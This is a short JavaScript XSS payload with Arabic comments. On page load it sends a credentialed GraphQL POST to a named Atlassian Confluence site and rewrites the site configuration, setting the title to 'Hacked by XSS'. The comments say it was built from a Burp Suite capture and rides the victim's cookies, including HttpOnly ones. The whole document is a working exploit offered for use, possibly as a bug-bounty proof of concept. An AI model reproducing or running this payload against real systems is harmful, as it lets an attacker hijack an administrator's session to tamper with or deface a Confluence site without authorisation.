function changeConfluenceTitle() {
  var xhttp = new XMLHttpRequest();
  // نستخدم المسار النسبي أو الدومين الكامل طالما أنه نفس النطاق
  var url = "https://anshall.atlassian.net/wiki/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";

  xhttp.open("POST", url, true);

  // إعداد الرؤوس المطلوبة
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  
  // تفعيل إرسال الكوكيز تلقائياً (بما فيها HttpOnly)
  xhttp.withCredentials = true;

  // بناء جسم الطلب (Payload) بناءً على ما استخرجته من Burp Suite
  var data = JSON.stringify([{
    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
    "variables": {
      "siteConfigInput": {
        "siteTitle": "Hacked by XSS", // العنوان الجديد الذي تريد وضعه
        "customContactMessage": "xxxx",
        "isContactAdministratorsFormEnabled": true,
        "siteHomePage": "Confluence Home",
        "isEditorConversionForSiteEnabled": true,
        "isEditorFullWidthEnabled": false,
        "isEmailNotificationEnabled": true,
        "isPushNotificationEnabled": true,
        "isLikesEnabled": true,
        "timeFormat": "h:mm a",
        "dateTimeFormat": "MMM dd, yyyy HH:mm",
        "dateFormat": "MMM dd, yyyy",
        "longNumberFormat": "###############",
        "decimalNumberFormat": "###############.##########",
        "maxAttachmentSize": 104857600,
        "maxNumberOfAttachmentsPerUpload": 6,
        "isExternalConnectionsEnabled": true,
        "connectionTimeout": 10000,
        "socketTimeout": 10000,
        "globalDefaultLocale": "en_US",
        "indexingLanguage": "english"
      }
    },
    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Status: " + this.status);
      if (this.status == 200) {
        console.log("Confluence Title Changed Successfully!");
      } else {
        console.log("Failed. Response: " + this.responseText);
      }
    }
  };

  xhttp.send(data);
}

// تنفيذ الدالة عند تحميل الصفحة
changeConfluenceTitle();
